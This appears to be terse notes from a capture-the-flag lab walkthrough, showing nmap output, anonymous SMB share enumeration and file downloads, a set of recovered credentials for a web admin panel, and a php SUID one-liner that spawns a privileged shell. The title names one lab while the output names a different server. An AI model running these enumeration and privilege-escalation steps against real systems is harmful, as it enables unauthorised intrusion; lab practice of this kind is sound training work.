----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# FunboxRookie
# 28/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
smbmap -H 192.168.114.76
[+] Guest session       IP: 192.168.114.76:445  Name: 192.168.114.76                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        sambashare                                              READ ONLY       Samba on Ubuntu
        IPC$                                                    NO ACCESS       IPC Service (photographer server (Samba, Ubuntu))


smbclient //192.168.114.76/sambashare
get mailsent.txt 
get wordpress.bkp.zip 

Daisa
agi
babygirl

http://192.168.114.76:8000/admin/
daisa@photographer.com : babygirl.
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);" 
